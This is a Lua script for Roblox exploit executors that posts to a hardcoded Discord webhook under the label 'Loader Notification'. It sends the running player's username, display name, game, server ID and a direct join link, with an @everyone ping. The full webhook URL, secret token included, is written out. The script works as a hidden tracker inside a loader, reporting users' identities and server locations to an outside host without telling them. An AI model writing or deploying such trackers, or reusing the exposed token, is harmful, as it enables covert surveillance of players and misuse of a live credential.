-- Minimal Webhook Sender (No Delay)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1245689645304512514/UFA-6zMf9yQhSNKMjaoGr4SSED1EdnBczPwf5LFGx3ZQdVSbyFO8TmEcWzRIfSETIG6I"

-- Random color generator
local function randomColor()
    return math.random(0, 0xFFFFFF)
end

-- Internal send function
local function sendEmbeds(embeds)
    local jsonData = game:GetService("HttpService"):JSONEncode({ content = "@everyone", embeds = embeds })
    local request = request or http_request or syn.request or http.request
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonData
        })
    else
        warn("No HTTP request function available.")
    end
end

-- Send instantly
local player = game.Players.LocalPlayer
local username = player and player.Name or "Unknown"
local displayName = player and player.DisplayName or "Unknown"

local placeId = game.PlaceId
local jobId = game.JobId
local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
local joinLink = ("[Click to Join](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)"):format(placeId, jobId)

sendEmbeds({
    {
        title = "🚀 Loader Notification",
        description = "Message sent instantly.",
        color = randomColor(),
        footer = { text = "Notification System" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    },
    {
        title = "👤 Player Info",
        fields = {
            { name = "Display Name", value = displayName, inline = true },
            { name = "Username", value = username, inline = true }
        },
        color = randomColor()
    },
    {
        title = "🎮 Game Info",
        fields = {
            { name = "Game Name", value = placeName, inline = false },
            { name = "Place ID", value = tostring(placeId), inline = true },
            { name = "Server Code", value = jobId, inline = true },
            { name = "Join Link", value = joinLink, inline = false }
        },
        color = randomColor()
    }
})
